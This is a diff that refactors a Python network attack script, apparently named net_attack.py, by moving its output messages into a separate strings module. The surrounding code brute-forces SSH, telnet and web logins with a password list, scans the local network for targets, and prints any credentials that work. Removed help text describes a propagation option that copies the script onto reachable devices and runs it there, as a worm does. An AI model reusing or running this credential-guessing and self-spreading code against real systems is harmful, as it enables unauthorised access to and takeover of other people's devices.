@@ -1,8 +1,8 @@
 #!/usr/bin/python3
+
 # from scapy.all import *
 # For use when adding new functionality with scapy, be sure to statically
 # import when finished, wildcard is just for convenience.
-
 from scapy.all import get_if_addr
 from scapy.interfaces import get_if_list
 from scapy.layers.inet import IP, TCP
@@ -12,13 +12,14 @@ from telnetlib import Telnet
 from time import sleep
 from paramiko import SSHClient, AutoAddPolicy
 import requests
+import strings
 
 """
  - Importing modules from scapy for Packet Crafting and Sending / Sniffing.
  - Importing telnetlib for telnet operations.
  - Importing Paramiko for ssh operations.
  - Importing requests for web based operations.
- - Importing sys to make OS calls and use OS level utilities.
+ - Importing strings for use of the external strings resources.
 """
 
 """
@@ -27,11 +28,6 @@ Functions and methods are organised alphabetically with the exception of the
 main method specified last. Every function has a block comment explaining what 
 it does.
 """
-
-# For ensuring the system exits properly but not for tests.
-PROPER_EXIT_CODE = 0
-# The exit code to be used for tests.
-TEST_EXIT_CODE = 255
 
 
 def additional_attacks(args, ip, port, bruteforce,
@@ -72,8 +68,7 @@ def assigning_values(args):
             passwords_filename = args[args.index("-f") + 1]
             return ip_list, target_ports, target_username, passwords_filename
         except RuntimeError:
-            print("!!!ERROR: IP LIST CANNOT BE READ FROM FILENAME: "
-                  + ip_addresses_filename + "!!!")
+            print(strings.ip_list_cannot_be_read(ip_addresses_filename))
             gtfo_and_rtfm()
 
 
@@ -163,19 +158,21 @@ def connect_ssh_client(ip, port, username, password):
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
         client.close()
-        connection_status("SSH", ip, port, username, password, "Successful")
+        print(strings.connection_status("SSH", ip, port, username, password,
+                                        "Successful"))
         return True
 
     except RuntimeError:
         client.close()
-        connection_status("SSH", ip, port, username, password, "Unsuccessful")
+        print(strings.connection_status("SSH", ip, port, username, password,
+                                        "Unsuccessful"))
         return False
 
 
 def connect_telnet(ip, port, username, password):
     """
-    This function checks to see if a telnet connection can be established
-    and if so then it returns true, if not then it returns false.
+    This function checks to see if a telnet connection can be established and
+    if so then it returns true, if not then it returns false.
     """
     try:
         tel = Telnet(host=ip, port=port, timeout=2)
@@ -185,16 +182,17 @@ def connect_telnet(ip, port, username, password):
         tel.write((str(password) + "\n").encode("ascii"))
 
         data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
-        connection_status("telnet", ip, port, username, password, "Successful")
+        print(strings.connection_status("telnet", ip, port, username, password,
+                                        "Successful"))
         if check_telnet_data("Welcome to", data):
             return True
-        connection_status("telnet", ip, port, username, password,
-                          "Unsuccessful")
+        print(strings.connection_status("telnet", ip, port, username, password,
+                                        "Unsuccessful"))
         return False
 
     except RuntimeError:
-        connection_status("telnet", ip, port, username, password,
-                          "Unsuccessful")
+        print(strings.connection_status("telnet", ip, port, username, password,
+                                        "Unsuccessful"))
         return False
 
 
@@ -208,19 +206,12 @@ def connect_web(ip, port, username, password):
         send_post_request_with_login(ip, port, username, password)
         attempt_succeeded = True
     except RuntimeError:
-        connection_status("web", ip, port, username, password, "Unsuccessful")
+        print(strings.connection_status("web", ip, port, username, password,
+                                        "Unsuccessful"))
     if attempt_succeeded:
-        connection_status("web", ip, port, username, password, "Successful")
+        print(strings.connection_status("web", ip, port, username, password,
+                                        "Successful"))
     return attempt_succeeded
-
-
-def connection_status(service, ip, port, username, password, status):
-    """
-    This function will print and create the connection status string dependent
-    on the context given by the arguments passed into it.
-    """
-    print(str(status) + " " + str(service) + " login to " + str(ip) + ":"
-          + str(port) + " using " + str(username) + ":" + str(password))
 
 
 def convert_file_to_list(filename):
@@ -256,11 +247,9 @@ def cycle_through_subnet(ip_list, interface):
 
 def file_error_handler(filename):
     """
-    This function handles errors related to the processing of files. Had to add
-    test parameter for avoiding system exits.
+    This function handles errors related to the processing of files.
     """
-    print("!!!ERROR: SOMETHING WENT WRONG WHEN PROCESSING THE FILENAME: "
-          + filename + "!!!")
+    print(strings.filename_processing_error(filename))
     gtfo_and_rtfm()
 
 
@@ -291,13 +280,10 @@ def gathering_local_ips(ip_list):
 
 def gtfo_and_rtfm():
     """
-    This function will print the help screen, show an exit prompt, and
-    gracefully exit the script... If you call telling the user to gtfo and
-    rtfm without them realising it graceful...
+    This function will print the help screen and show an exit prompt.
     """
-    pls_help()
-    print("Exiting...")
-    return
+    print(strings.PLS_HELP)
+    print(strings.EXITING)
 
 
 def is_reachable_ip(ip):
@@ -320,27 +306,6 @@ def is_reachable_ip(ip):
         return True
     print(str(ip) + " was not reachable.")
     return False
-
-
-def pls_help():
-    """
-    This function prints the help screen for the end user.
-    """
-    print("Parameters:")
-    print("\t-t -> Filename for a file containing a list of target IP"
-          + " addresses")
-    print("\t-p -> Ports to scan on the target host")
-    print("\t-u -> A username")
-    print("\t-f -> Filename for a file containing a list of passwords")
-    print("\t-L -> Scans the lan across all interfaces and creates/adds to"
-          + " the list of target IP addresses")
-    print("\t-P -> Propagates the script onto available devices and"
-          + " executes the script using the given command")
-    print("Example usage:")
-    print("\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f"
-          + " my_password_list.txt")
-    print("\t./net_attack.py -t ip_list.txt -p 22 -u root -f"
-          + " passwords.txt")
 
 
 def propagate_script(ip, port, login_string):
@@ -442,10 +407,12 @@ def send_post_request_with_login(ip, port, username, password):
                              data={"username": username, "password": password},
                              timeout=4)
     if response:
-        connection_status("web", ip, port, username, password, "Successful")
+        print(strings.connection_status("web", ip, port, username, password,
+                                        "Successful"))
         return str(username) + ":" + str(password)
     else:
-        connection_status("web", ip, port, username, password, "Unsuccessful")
+        print(strings.connection_status("web", ip, port, username, password,
+                                        "Unsuccessful"))
         return None
 
 
